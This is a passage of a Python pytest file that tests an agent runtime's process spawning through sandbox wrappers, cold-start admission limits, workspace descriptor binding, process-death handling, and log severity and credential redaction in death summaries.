    import kiro_crew.acp.runtime as runtime_mod

    admission = _ColdStartAdmission(limit=1)
    monkeypatch.setattr(runtime_mod, "_cold_start_admission", lambda: admission)
    entered = asyncio.Event()
    block = asyncio.Event()

    async def blocked_spawn(self):
        entered.set()
        await block.wait()

    monkeypatch.setattr(AcpRuntime, "_spawn_admitted", blocked_spawn)
    task = asyncio.create_task(AcpRuntime().spawn())
    try:
        await await_until(entered, what="the spawn entering")
        task.cancel()
        with pytest.raises(asyncio.CancelledError):
            await task
    finally:
        if not task.done():
            task.cancel()
            await asyncio.gather(task, return_exceptions=True)

    assert admission.active == 0
    monkeypatch.setattr(AcpRuntime, "_spawn_admitted", AsyncMock(return_value=None))
    await AcpRuntime().spawn()
    assert admission.active == 0


@pytest.mark.asyncio
async def test_cold_start_queued_cancellation_does_not_consume_slot(monkeypatch):
    import kiro_crew.acp.runtime as runtime_mod

    admission = _ColdStartAdmission(limit=1)
    monkeypatch.setattr(runtime_mod, "_cold_start_admission", lambda: admission)
    entered = asyncio.Event()
    release = asyncio.Event()

    async def blocked_spawn(self):
        entered.set()
        await release.wait()

    monkeypatch.setattr(AcpRuntime, "_spawn_admitted", blocked_spawn)
    active = asyncio.create_task(AcpRuntime().spawn())
    queued = None
    try:
        await await_until(entered, what="the spawn entering")
        queued = asyncio.create_task(AcpRuntime().spawn())
        await _wait_for_queued(admission, 1)

        queued.cancel()
        with pytest.raises(asyncio.CancelledError):
            await queued
        assert admission.active == 1
        assert admission.queued == 0
    finally:
        release.set()
        if queued is not None and not queued.done():
            queued.cancel()
        cleanup_tasks = [active] + ([] if queued is None else [queued])
        await asyncio.gather(*cleanup_tasks, return_exceptions=True)

    assert admission.active == 0


@pytest.mark.asyncio
async def test_cold_start_exception_releases_admission_slot(monkeypatch):
    import kiro_crew.acp.runtime as runtime_mod

    admission = _ColdStartAdmission(limit=1)
    monkeypatch.setattr(runtime_mod, "_cold_start_admission", lambda: admission)

    async def fail_spawn(self):
        raise RuntimeError("initialize failed")

    monkeypatch.setattr(AcpRuntime, "_spawn_admitted", fail_spawn)
    with pytest.raises(RuntimeError, match="initialize failed"):
        await AcpRuntime().spawn()
    assert admission.active == 0

    monkeypatch.setattr(AcpRuntime, "_spawn_admitted", AsyncMock(return_value=None))
    await AcpRuntime().spawn()
    assert admission.active == 0


@pytest.mark.asyncio
async def test_runtime_spawn_retries_one_creation_failure_after_backoff(monkeypatch):
    import kiro_crew.acp.runtime as runtime_mod

    process = MagicMock()
    sleep = AsyncMock()
    create = AsyncMock(side_effect=[FileNotFoundError("kiro-cli is being replaced"), process])
    monkeypatch.setattr(runtime_mod.asyncio, "sleep", sleep)

    assert await runtime_mod._retrying_spawn_factory(create) is process

    assert create.await_count == 2
    sleep.assert_awaited_once_with(runtime_mod._ACP_RUNTIME_RESPAWN_BACKOFF_S)


def test_cold_start_admission_registry_releases_contended_closed_loop(monkeypatch):
    import kiro_crew.acp.runtime as runtime_mod

    monkeypatch.setattr(
        runtime_mod,
        "_cold_start_admissions",
        runtime_mod.weakref.WeakKeyDictionary(),
    )
    monkeypatch.setattr(runtime_mod, "_COLD_START_MAX_CONCURRENT", 1)

    loop = asyncio.new_event_loop()
    loop_ref = weakref.ref(loop)
    asyncio.set_event_loop(loop)

    async def contend_and_drain():
        admission = runtime_mod._cold_start_admission()
        assert runtime_mod._cold_start_admission() is admission
        await admission.acquire(StartPriority.BACKGROUND)
        queued = asyncio.create_task(admission.acquire(StartPriority.BACKGROUND))
        await _wait_for_queued(admission, 1)
        admission_ref = weakref.ref(admission)
        queued.cancel()
        await asyncio.gather(queued, return_exceptions=True)
        admission.release(StartPriority.BACKGROUND)
        assert admission.active == 0
        assert admission.queued == 0
        return admission_ref

    try:
        admission_ref = loop.run_until_complete(contend_and_drain())
    finally:
        asyncio.set_event_loop(None)
        loop.close()
        del loop

    gc.collect()
    assert admission_ref() is None
    assert loop_ref() is None


@pytest.mark.asyncio
@pytest.mark.parametrize("project_skills", [True, False])
async def test_runtime_spawn_passes_installed_path_through_exact_wrappers(
    tmp_path,
    monkeypatch,
    project_skills,
):
    import kiro_crew.acp.runtime as runtime_mod

    monkeypatch.setenv("KIROCREW_NATIVE_SKILL_PROJECTION", "1" if project_skills else "0")
    macos_dir = tmp_path / "Kiro CLI.app" / "Contents" / "MacOS"
    macos_dir.mkdir(parents=True)
    executable = macos_dir / "kiro-cli"
    executable.write_bytes(b"#!/bin/sh\n")
    executable.chmod(0o755)
    (macos_dir / "kiro-cli-chat").write_bytes(b"sibling")
    launch_path = str(executable)
    wrapped: dict[str, object] = {}

    class _StopSpawn(Exception):
        pass

    def capture_wrap(argv, mode, **kwargs):
        wrapped.update(argv=list(argv), mode=mode, kwargs=kwargs)
        return ["/usr/bin/sandbox-wrapper", *argv], None

    async def stop_spawn(*args, **kwargs):
        wrapped["spawn_args"] = args
        wrapped["spawn_kwargs"] = kwargs
        # Read while the spawn is still in flight: its failure path closes the
        # bound workspace descriptor and clears the attribute.
        wrapped["bound_fd"] = runtime._bound_workspace_fd
        raise _StopSpawn()

    async def resolve_installed(*, environ=None, home=None):
        return launch_path

    client_mod = _spawn_client_mod()
    monkeypatch.setattr(
        client_mod,
        "_resolve_kiro_bin_for_spawn",
        resolve_installed,
    )
    monkeypatch.setattr(runtime_mod, "wrap_argv", capture_wrap)
    voice_guard = MagicMock()
    monkeypatch.setattr(runtime_mod, "assert_voice_runtime_outside_agent_workspace", voice_guard)
    monkeypatch.setattr(
        runtime_mod,
        "cgroup_scope_argv",
        lambda argv: ["/usr/bin/cgroup-wrapper", *argv],
    )
    # The claim below is about the SNAPSHOT descriptor (there must be none, the
    # binary is exec'd in place). On macOS the darwin-only workspace binding adds
    # its own descriptor to pass_fds, so pin that seam to the no-descriptor shape
    # every other platform already produces, or the assertion reads the wrong fd.

    async def _unbound_workspace(work_dir):
        return work_dir, None

    monkeypatch.setattr(runtime_mod, "bind_voice_safe_agent_workspace_async", _unbound_workspace)
    monkeypatch.setattr(runtime_mod, "create_subprocess_limited", stop_spawn)

    runtime = AcpRuntime(work_dir=tmp_path / "workspace")
    with pytest.raises(_StopSpawn):
        await runtime.spawn()

    if project_skills:
        native_agent = runtime._native_skill_projection.spawn_agent(runtime._agent)
    else:
        assert runtime._native_skill_projection is None
        native_agent = runtime._agent
    assert wrapped["argv"] == [launch_path, "acp", "--agent", native_agent]
    assert wrapped["mode"] == "auto"
    wrap_kwargs = dict(wrapped["kwargs"])
    # The per-process scratch window is allocated at spawn time; its path is
    # runtime-owned, so only its presence and shape are pinned here.
    extra_private = wrap_kwargs.pop("extra_private_dirs")
    assert isinstance(extra_private, (list, tuple))
    # The default tier leaves ~/.ssh readable, so the ssh-agent socket is kept.
    assert wrap_kwargs == {
        "strip_python_env": True,
        "is_kiro_cli": True,
        **({} if sys.platform == "win32" else {"forward_ssh_auth_sock": True}),
    }
    voice_guard.assert_called_once_with(runtime._work_dir)
    assert strip_spawn_shim(wrapped["spawn_args"]) == (
        "/usr/bin/cgroup-wrapper",
        "/usr/bin/sandbox-wrapper",
        launch_path,
        "acp",
        "--agent",
        native_agent,
    )
    spawn_kwargs = wrapped["spawn_kwargs"]
    assert isinstance(spawn_kwargs, dict)
    # The installed binary is exec'd in place: the ONLY descriptor handed to the
    # child is the verified workspace the spawn shim must `fchdir` into, never an
    # inherited snapshot descriptor. Nothing binds a workspace off macOS, so the
    # expected set is empty there -- asserting the exact set rather than the absence
    # of the key keeps the same strength on Linux and stops pinning the platform's
    # own spawn shape on darwin.
    bound_fd = wrapped["bound_fd"]
    expected_fds: tuple[int, ...] = () if bound_fd is None else (bound_fd,)
    assert tuple(spawn_kwargs.get("pass_fds", ())) == expected_fds
    # The sibling subcommand binary a multi-call CLI dispatches to is still
    # reachable beside the launch path.
    assert (Path(launch_path).parent / "kiro-cli-chat").exists()


@pytest.mark.asyncio
async def test_bound_macos_runtime_hands_sessions_the_verified_pathname(monkeypatch, tmp_path):
    """The ACP peer resolves this name itself, so it must be a name it can resolve.

    It is returned only after the descriptor proves it still names the bound
    identity. The earlier "/dev/fd/<n>" spelling is not resolvable on macOS -- the
    only platform that binds -- so it reached the peer as an unusable cwd.
    """
    import kiro_crew.acp.runtime as runtime_mod

    runtime = AcpRuntime(work_dir=tmp_path)
    runtime._bound_workspace_fd = 71
    runtime._spawn_work_dir = str(tmp_path)
    target = AsyncMock(return_value="/canonical/workspace")
    monkeypatch.setattr(runtime_mod, "resolve_bound_session_workspace", target)

    # The DESCRIPTOR's own name, not the pathname the caller asked with: the peer
    # re-resolves what it is handed, so the caller's spelling would leave the
    # retarget window open.
    assert await runtime._session_work_dir(tmp_path) == "/canonical/workspace"
    target.assert_called_once_with(71, tmp_path)


@pytest.mark.asyncio
async def test_bound_macos_runtime_rejects_descendant_session_workspace(monkeypatch, tmp_path):
    import kiro_crew.acp.runtime as runtime_mod

    runtime = AcpRuntime(work_dir=tmp_path)
    runtime._bound_workspace_fd = 71
    runtime._spawn_work_dir = str(tmp_path)
    descendant = tmp_path / "packages" / "app"
    target = AsyncMock(side_effect=runtime_mod.BoundWorkspaceMismatch(str(descendant)))
    monkeypatch.setattr(runtime_mod, "resolve_bound_session_workspace", target)

    with pytest.raises(AcpRuntimeError, match="exact workspace"):
        await runtime._session_work_dir(descendant)
    target.assert_awaited_once_with(71, descendant)


@pytest.mark.asyncio
async def test_bound_macos_runtime_rejects_different_session_workspace(monkeypatch, tmp_path):
    import kiro_crew.acp.runtime as runtime_mod

    runtime = AcpRuntime(work_dir=tmp_path)
    runtime._bound_workspace_fd = 72
    runtime._spawn_work_dir = str(tmp_path)
    monkeypatch.setattr(
        runtime_mod,
        "resolve_bound_session_workspace",
        AsyncMock(side_effect=runtime_mod.BoundWorkspaceMismatch("retargeted")),
    )

    with pytest.raises(AcpRuntimeError, match="exact workspace"):
        await runtime._session_work_dir(tmp_path / "retargeted")


@pytest.mark.asyncio
async def test_kill_cancellation_still_releases_bound_workspace(monkeypatch, tmp_path):
    import kiro_crew.acp.runtime as runtime_mod

    runtime = AcpRuntime(work_dir=tmp_path)
    runtime._bound_workspace_fd = 73
    runtime._spawn_work_dir = str(tmp_path)
    entered = asyncio.Event()
    closed: list[int] = []

    async def stalled_teardown(*, expected=False, reason=""):
        entered.set()
        await asyncio.Event().wait()

    async def record_release(descriptor):
        closed.append(descriptor)

    monkeypatch.setattr(runtime, "_kill_inner", stalled_teardown)
    monkeypatch.setattr(runtime_mod, "release_bound_agent_workspace", record_release)

    task = asyncio.create_task(runtime.kill())
    await entered.wait()
    task.cancel()
    with pytest.raises(asyncio.CancelledError):
        await task

    assert closed == [73]
    assert runtime._bound_workspace_fd is None
    assert runtime._spawn_work_dir == str(tmp_path)


# ── Process death propagation ──


@pytest.mark.asyncio
async def test_process_exit_marks_dead_and_poisons_queues():
    rt, reader, _ = _make_runtime()
    q = _register(rt, "sA", "sB")
    fut: asyncio.Future = asyncio.get_event_loop().create_future()
    rt._pending_requests[3] = fut
    task = await _start_reader(rt)
    try:
        reader.feed_eof()  # empty readline → process exited
        # Pending future fails, every session queue gets a None poison sentinel.
        with pytest.raises(AcpRuntimeDead):
            await await_until(fut, what="the pending request's future")
        assert await _next(q["sA"]) is None
        assert await _next(q["sB"]) is None
        assert rt._dead is True
    finally:
        await _stop_reader(task)


@pytest.mark.asyncio
async def test_mark_dead_is_idempotent():
    rt, _, _ = _make_runtime()
    q = _register(rt, "sA")
    rt._mark_dead("first")
    rt._mark_dead("second")  # no-op, must not double-poison or raise
    assert await _next(q["sA"]) is None
    assert q["sA"].empty()


# ── An exit the reader OBSERVES retires the registry entries too ─────────────
#
# ``_kill_inner`` untracks the root after its own reap. A root killed from outside
# reached no kill, so its ``kiro_session_pids.txt`` / ``kiro_pids.txt`` lines
# survived until the periodic sweep's next tick, up to 300s. Measured on the
# nightly leak gate: SIGKILL of a background runtime left its line for 293s. The
# reader loop's EOF branch now retires the two entries once the exit is CONFIRMED,
# and only then -- a closed stdout on a process that is still running, or one
# whose exit cannot be confirmed within the reap window, keeps its lines.


def _track_untracks(monkeypatch, rt_mod, *, pid_exists: bool):
    """Record every identity-bound retirement; the real one is pinned in
    test_pid_lifecycle.py against the files themselves."""
    calls: list[tuple[int, str | None]] = []
    monkeypatch.setattr(
        rt_mod, "_untrack_root_by_identity", lambda p, tok: calls.append((p, tok)) or True
    )
    monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda p: pid_exists)
    return calls


@pytest.mark.asyncio
async def test_observed_exit_retires_registry_entries_once_reaped(monkeypatch):
    """EOF on a root that the child watcher then reaps: both entries are dropped."""
    import kiro_crew.acp.runtime as rt_mod

    rt, reader, proc = _make_runtime()
    rt._spawn_start_token = "tok-4242"
    calls = _track_untracks(monkeypatch, rt_mod, pid_exists=False)

    async def _reap():  # the reap lands after EOF, as in the field
        proc.returncode = -9
        return -9

    proc.wait = _reap
    task = await _start_reader(rt)
    try:
        reader.feed_eof()
        await await_until(task, what="the reader loop exiting")
    finally:
        await _stop_reader(task)
    assert rt._dead is True
    # Bound to the identity read at spawn, never to the bare number.
    assert calls == [(4242, "tok-4242")]
    # The status the wait measured reaches the retained summary: a turn or a
    # cron that records this death sees the real code, not ``<not reaped>``.
    assert rt._death_label == "-9"
    assert rt._death_summary is not None and "returncode=-9" in rt._death_summary


@pytest.mark.asyncio
async def test_observed_exit_keeps_tracking_while_the_root_still_runs(monkeypatch):
    """A closed stdout is not an exit. A root that never exits within the reap
    window, or one whose pid still answers after the wait, stays tracked -- an
    untracked live process is invisible to every reaper for the host's uptime."""
    import kiro_crew.acp.runtime as rt_mod

    # Wait times out: the process closed its pipe and kept running.
    rt, reader, proc = _make_runtime()
    calls = _track_untracks(monkeypatch, rt_mod, pid_exists=False)
    rt._KILL_REAP_TIMEOUT = 0.05

    async def _never_exits():
        await asyncio.sleep(10)

    proc.wait = _never_exits
    task = await _start_reader(rt)
    try:
        reader.feed_eof()
        await await_until(task, what="the reader loop exiting")
    finally:
        await _stop_reader(task)
    assert calls == []

    # Reaped by the watcher's account, yet the pid still answers: retain.
    rt, reader, proc = _make_runtime()
    calls = _track_untracks(monkeypatch, rt_mod, pid_exists=True)
    proc.returncode = 1
    task = await _start_reader(rt)
    try:
        reader.feed_eof()
        await await_until(task, what="the reader loop exiting")
    finally:
        await _stop_reader(task)
    assert calls == []


@pytest.mark.asyncio
async def test_eof_inside_an_oversize_line_retires_the_same_way(monkeypatch):
    """The other observed-EOF return: stdout closes mid-oversize-line. Same
    confirmed exit, same retirement -- a sibling left to the sweep would carry
    the very 300s window the empty-line branch closes."""
    import kiro_crew.acp.runtime as rt_mod

    rt, reader, proc = _make_runtime()
    rt._spawn_start_token = "tok-4242"
    calls = _track_untracks(monkeypatch, rt_mod, pid_exists=False)
    proc.returncode = 137
    task = await _start_reader(rt)
    try:
        # Over the reader's line limit with no newline, then EOF: readuntil raises
        # LimitOverrunError, the drain hits IncompleteReadError.
        reader.feed_data(b"x" * (reader._limit + 1))
        reader.feed_eof()
        await await_until(task, what="the reader loop exiting")
    finally:
        await _stop_reader(task)
    assert rt._dead is True
    assert calls == [(4242, "tok-4242")]


# ── Death-log severity: deliberate teardown vs genuine death ──
#
# A warm-pool TTL recycle tears runtimes down via kill() on a schedule; logging
# that at the same severity and shape as a crash made `kirocrew logs` misreport
# routine recycling as process death. These tests pin the split: kill() → INFO,
# every genuine death path → WARNING, and the state transitions identical.


def _death_records(caplog):
    """The 'AcpRuntime dead' records, selected by the raw log template so the
    assertions can check levelname (severity) separately from message shape."""
    return [r for r in caplog.records if str(r.msg).startswith("AcpRuntime dead")]


def _neuter_kill_side_effects(monkeypatch, proc):
    """Keep kill() away from the host: never signal the fake PID (4242 could be
    a real process), never touch the PID-tracking files.

    The Windows drain stand-in awaits ``process.wait()`` because the real
    ``terminate_windows_asyncio_tree`` does, and that await is what populates
    ``returncode``. A stand-in returning without it hands the Windows branch a
    process whose status is unreadable, so every assertion about the post-reap
    exit status would read the unreaped placeholder on that platform alone --
    the double disagreeing with the code rather than the code being wrong.

    That await carries the real one's BOUND as well, off the same constant: a
    child that never exits makes the real drain raise rather than wait forever,
    so a stand-in awaiting without the bound turns a test whose child never
    exits into a hang instead of a failure.
    """
    import kiro_crew.acp.runtime as rt_mod

    proc.wait = AsyncMock(return_value=0)

    async def _drain_windows_tree(process):
        await asyncio.wait_for(
            process.wait(),
            timeout=rt_mod.platform_compat._WINDOWS_TREE_REAP_TIMEOUT_SECS,
        )
        return True

    monkeypatch.setattr(rt_mod.platform_compat, "kill_process_tree", lambda *a, **k: None)
    monkeypatch.setattr(
        rt_mod.platform_compat, "terminate_windows_asyncio_tree", _drain_windows_tree
    )
    monkeypatch.setattr(rt_mod.platform_compat, "pid_exists", lambda pid: False)
    monkeypatch.setattr(rt_mod, "_untrack_pid", lambda p: None)
    monkeypatch.setattr(rt_mod, "_untrack_session_pid", lambda p: None)


@pytest.mark.asyncio
async def test_deliberate_kill_logs_info_and_still_fails_pending_futures(caplog, monkeypatch):
    """A deliberate kill(expected=True) of a LIVE runtime (pool recycle /
    session shutdown) must log the death at INFO — no WARNING — while
    everything non-log stays identical: pending futures still fail with
    AcpRuntimeDead and session queues are poisoned."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    q = _register(rt, "sA")
    fut: asyncio.Future = asyncio.get_event_loop().create_future()
    rt._pending_requests[7] = fut

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(expected=True)

    records = _death_records(caplog)
    assert [r.levelname for r in records] == ["INFO"]
    assert "killed" in records[0].getMessage()
    # Severity-only change: waiters still learn the runtime died.
    with pytest.raises(AcpRuntimeDead):
        await await_until(fut, what="the pending request's future")
    assert await _next(q["sA"]) is None


@pytest.mark.asyncio
async def test_kill_default_is_unexpected_and_warns(caplog, monkeypatch):
    """A bare kill() keeps the WARNING: the default is fail-safe so every
    cleanup kill on a failure path — initialize()'s failed-spawn cleanup, a
    failed session setup — and any future call site stays a WARNING without
    opting in."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill()

    assert [r.levelname for r in _death_records(caplog)] == ["WARNING"]


@pytest.mark.asyncio
async def test_kill_reason_lands_in_death_log_and_summary(caplog, monkeypatch):
    """kill(reason=...) attributes the death: the reason must appear in the
    'AcpRuntime dead' log line AND be retained by death_summary() alongside
    returncode and stderr tail. Field motivation: three unattributed
    'killed [returncode=None]' deaths in five days — one under a live cron
    turn — were undiagnosable because no caller identified itself."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(expected=True, reason="warm mint teardown")

    records = _death_records(caplog)
    assert len(records) == 1
    assert "killed (warm mint teardown)" in records[0].getMessage()
    summary = rt.death_summary()
    assert summary is not None
    assert "killed (warm mint teardown)" in summary
    assert "returncode=" in summary
    assert "stderr_tail:" in summary


@pytest.mark.asyncio
async def test_death_summary_is_none_while_alive(monkeypatch):
    """death_summary() answers None until _mark_dead composes it — a live
    runtime must not advertise a stale or empty attribution."""
    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    assert rt.death_summary() is None
    await rt.kill()
    assert rt.death_summary() is not None


@pytest.mark.asyncio
async def test_death_summary_redacts_credentials_from_stderr_tail(caplog, monkeypatch):
    """The stderr tail is uninspected child output and the summary OUTLIVES
    the log: it rides AcpProcessDied into a turn's error, and a cron failure
    stringifies that into job.last_error, persisted to sandbox-visible
    crons.json. Credential material in the child's stderr must therefore be
    redacted before the summary is composed (same treatment as the send
    path's 'ACP process exited' detail)."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    secret = "ghp_0123456789abcdefghijklmnopqrstuvwxyzAB"
    rt._stderr_lines = [f"auth error: token {secret} rejected"]

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(expected=True, reason="warm mint teardown")

    summary = rt.death_summary()
    assert summary is not None
    assert secret not in summary
    assert "stderr_tail:" in summary
    # The death log line gets the same redacted tail.
    for record in _death_records(caplog):
        assert secret not in record.getMessage()


@pytest.mark.asyncio
async def test_kill_refuses_info_downgrade_when_process_already_exited(caplog, monkeypatch):
    """A replacement path can observe is_alive() == False (returncode set by
    the child watcher) and kill() before the reader loop marks the death.
    That is a genuine death being reaped, not a teardown this caller started:
    expected=True must be refused and the WARNING kept."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    proc.returncode = 1  # process already exited on its own; _dead still False

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(expected=True)

    records = _death_records(caplog)
    assert [r.levelname for r in records] == ["WARNING"]
    assert "returncode=1" in records[0].getMessage()


@pytest.mark.asyncio
async def test_unexpected_process_exit_still_warns_with_diagnostic_shape(caplog):
    """A genuine death (process exited) keeps today's WARNING and its full
    diagnostic shape — reason with rc, returncode=, stderr_tail: — unchanged."""
    import logging

    rt, reader, proc = _make_runtime()
    proc.returncode = 1
    fut: asyncio.Future = asyncio.get_event_loop().create_future()
    rt._pending_requests[3] = fut
    task = await _start_reader(rt)
    try:
        with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
            reader.feed_eof()  # empty readline → process exited
            with pytest.raises(AcpRuntimeDead):
                await await_until(fut, what="the pending request's future")
    finally:
        await _stop_reader(task)

    records = _death_records(caplog)
    assert [r.levelname for r in records] == ["WARNING"]
    msg = records[0].getMessage()
    assert "process exited (rc=1)" in msg
    assert "returncode=1" in msg
    assert "stderr_tail: <none>" in msg


# ── A returncode nobody could read yet is labelled, never printed as None ─────
#
# ``_kill_inner`` marks the death BEFORE it signals, so pending waiters learn of
# it first. ``_mark_dead`` then reads ``returncode`` on a process that has not
# been reaped, and the line it wrote was indistinguishable from a child killed
# by a signal whose status was never captured: ``killed [returncode=None]
# stderr_tail: <none>`` — the shape an operator chasing an external killer had
# to work from. The status is labelled at mark time and filled in once the reap
# lands.


def _reap_records(caplog):
    """The post-reap amendment records, selected by the raw log template."""
    return [r for r in caplog.records if str(r.msg).startswith("AcpRuntime reaped after kill")]


@pytest.mark.asyncio
async def test_kill_of_live_runtime_labels_the_unreaped_returncode(caplog, monkeypatch):
    """A live runtime killed by a caller has no exit status at mark time. The
    death line must say so rather than print a bare ``returncode=None``, which
    reads as "died by signal, status unknown" — the wrong suspect."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    assert proc.returncode is None  # live: nothing has reaped it

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(reason="displaced by a new allocation")

    msg = _death_records(caplog)[0].getMessage()
    assert "returncode=<not reaped>" in msg
    assert "returncode=None" not in msg
    assert "displaced by a new allocation" in msg


@pytest.mark.asyncio
@pytest.mark.parametrize(("expected", "level"), [(False, "WARNING"), (True, "INFO")])
async def test_kill_amends_the_summary_once_the_reap_completes(
    expected, level, caplog, monkeypatch
):
    """The status IS knowable after the reap. It is written into the retained
    summary — which outlives the log, riding AcpProcessDied into a turn's error
    and a cron's last_error — and logged at the death's own severity, so an
    operator filtering one level never sees the death without the code."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)

    async def _wait():
        proc.returncode = -15  # the SIGTERM this kill just sent
        return proc.returncode

    proc.wait = _wait

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(expected=expected, reason="warm mint teardown")

    summary = rt.death_summary()
    assert summary is not None
    assert "[returncode=-15]" in summary
    assert "<not reaped>" not in summary
    assert "returncode=None" not in summary
    assert "warm mint teardown" in summary
    reaped = _reap_records(caplog)
    assert [r.levelname for r in reaped] == [level]
    assert "returncode=-15" in reaped[0].getMessage()


@pytest.mark.asyncio
async def test_reap_amendment_leaves_the_stderr_tail_untouched(caplog, monkeypatch):
    """The amendment rebuilds the line from its parts, so a child stderr line
    that happens to carry this format's own ``[returncode=...]`` shape is
    carried through verbatim. Editing the composed text instead would rewrite
    that tail as an exit status -- the diagnostic destroying its own evidence,
    in the one string that outlives the log."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    echoed = "child said [returncode=<not reaped>] on its way out"
    rt._stderr_lines = [echoed]

    async def _wait():
        proc.returncode = -15
        return proc.returncode

    proc.wait = _wait

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(reason="displaced by a new allocation")

    summary = rt.death_summary()
    assert summary is not None
    assert summary.endswith(f"stderr_tail: {echoed}")
    assert "[returncode=-15]" in summary
    # Exactly one status field, and the child's copy is not it.
    assert summary.count("[returncode=") == 2
    assert summary.count("[returncode=-15]") == 1


@pytest.mark.asyncio
async def test_reap_amendment_leaves_the_reason_untouched(caplog, monkeypatch):
    """The REASON can carry child text too, and it sits BEFORE the status field:
    ``_exit_reason`` appends the child's last stderr line, and a reader-crash
    reason embeds an exception message. So bounding a text rewrite to the first
    hit is not enough either — the first hit can be inside the reason."""
    import logging

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    poisoned = "reader crash: boom [returncode=<not reaped>] while draining"
    rt._mark_dead(poisoned)  # a death already recorded, status not yet read

    async def _wait():
        proc.returncode = -15
        return proc.returncode

    proc.wait = _wait

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(reason="reaping a dead runtime")

    summary = rt.death_summary()
    assert summary is not None
    assert summary.startswith(poisoned)
    assert summary.endswith("[returncode=-15] stderr_tail: <none>")


@pytest.mark.asyncio
async def test_the_windows_branch_amends_the_summary_too(caplog, monkeypatch):
    """The Windows teardown runs INSTEAD of the POSIX ladder and returns from
    ``_kill_inner`` on its own, so it has to record the reap itself. Pinned with
    the platform forced rather than left to the Windows shards, because a branch
    only one CI lane reaches is a branch whose loss is invisible everywhere else
    -- and the status it carries outlives the log, riding ``AcpProcessDied`` into
    a turn's error and a cron's ``last_error``."""
    import logging

    import kiro_crew.acp.runtime as rt_mod

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    monkeypatch.setattr(rt_mod.platform_compat, "IS_WINDOWS", True)

    async def _wait():
        proc.returncode = 1  # a Win32 exit code, never a negative signal
        return proc.returncode

    proc.wait = _wait

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        await rt.kill(expected=True, reason="warm mint teardown")

    summary = rt.death_summary()
    assert summary is not None
    assert "[returncode=1]" in summary
    assert "<not reaped>" not in summary
    assert "returncode=None" not in summary
    reaped = _reap_records(caplog)
    assert [r.levelname for r in reaped] == ["INFO"]


@pytest.mark.asyncio
async def test_a_slow_windows_drain_is_one_warning_and_keeps_the_process(caplog, monkeypatch):
    """A tree that outlives one bounded drain pass is pending cleanup, not lost.

    The kill still raises -- its callers retain the runtime on a raise, and the
    drain kept every pin for the cleanup sweep -- but the log says exactly that
    in one line, without a traceback. A traceback here reads in the field as the
    crash, and hides the failure that asked for the kill.
    """
    import logging

    import kiro_crew.acp.runtime as rt_mod

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    monkeypatch.setattr(rt_mod.platform_compat, "IS_WINDOWS", True)
    pending = rt_mod.platform_compat.WindowsTreeDrainPending(root_pid=4242, pending=3)

    async def _drain_is_slow(process):
        raise pending

    monkeypatch.setattr(rt_mod.platform_compat, "terminate_windows_asyncio_tree", _drain_is_slow)

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        with pytest.raises(rt_mod.platform_compat.WindowsTreeDrainPending):
            await rt.kill(reason="failed session setup cleanup")

    assert rt._process is proc, "a tree still draining dropped its process"
    assert rt._process_tree_confirmed_dead is False
    records = [
        r
        for r in caplog.records
        if r.name == "kiro_crew.acp.runtime" and "cleanup sweep" in r.getMessage()
    ]
    assert len(records) == 1, [r.getMessage() for r in caplog.records]
    assert records[0].levelname == "WARNING"
    assert records[0].exc_info is None
    assert "4242" in records[0].getMessage()
    assert "3 member" in records[0].getMessage()
    assert not [
        r for r in caplog.records if r.name == "kiro_crew.acp.runtime" and r.exc_info
    ], "a slow drain still logged a traceback"


@pytest.mark.asyncio
async def test_an_unconfirmed_windows_drain_leaves_the_placeholder(caplog, monkeypatch):
    """A drain that cannot confirm every member's exit RAISES and keeps the
    process pinned for maintenance to retry. The status is then genuinely
    unknown, so the placeholder must survive: amending it from a handle whose
    tree was never drained would state an exit this runtime cannot vouch for."""
    import logging

    import kiro_crew.acp.runtime as rt_mod

    rt, _, proc = _make_runtime()
    _neuter_kill_side_effects(monkeypatch, proc)
    monkeypatch.setattr(rt_mod.platform_compat, "IS_WINDOWS", True)

    async def _drain_fails(process):
        raise OSError("Windows tree tracking retirement did not complete")

    monkeypatch.setattr(rt_mod.platform_compat, "terminate_windows_asyncio_tree", _drain_fails)

    with caplog.at_level(logging.INFO, logger="kiro_crew.acp.runtime"):
        with pytest.raises(OSError):
            await rt.kill(reason="warm mint teardown")

    summary = rt.death_summary()
    assert summary is not None
    assert "[returncode=<not reaped>]" in summary
    assert _reap_records(caplog) == []


@pytest.mark.asyncio
async def test_no_amendment_when_the_status_was_already_known(caplog, monkeypatch):
    """A process that exited on its own is marked WITH its code, so nothing is
    owed after the reap — not even when the stderr tail happens to carry the
    unread-status shape. Deciding this from the summary's text rather than from
    the status actually recorded would answer yes on that tail."""
    import logging

    rt, _, proc = _make_runtime()
